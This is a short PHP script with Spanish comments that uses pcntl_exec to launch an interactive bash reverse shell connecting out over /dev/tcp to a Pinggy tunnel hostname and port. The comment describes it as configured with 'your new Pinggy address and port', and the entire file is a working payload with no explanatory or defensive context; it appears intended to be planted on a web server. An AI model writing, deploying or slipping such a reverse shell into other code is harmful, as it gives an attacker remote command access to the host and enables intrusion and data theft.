<?php
$cmd = '/bin/sh';
// Configurado con tu nueva dirección y puerto de Pinggy
$args = array('-c', '/bin/bash -i >& /dev/tcp/iinne-190-114-40-40.run.pinggy-free.link/35261 0>&1');

if (function_exists('pcntl_exec')) {
    pcntl_exec($cmd, $args);
} else {
    echo "pcntl_exec no está disponible.";
}
?>
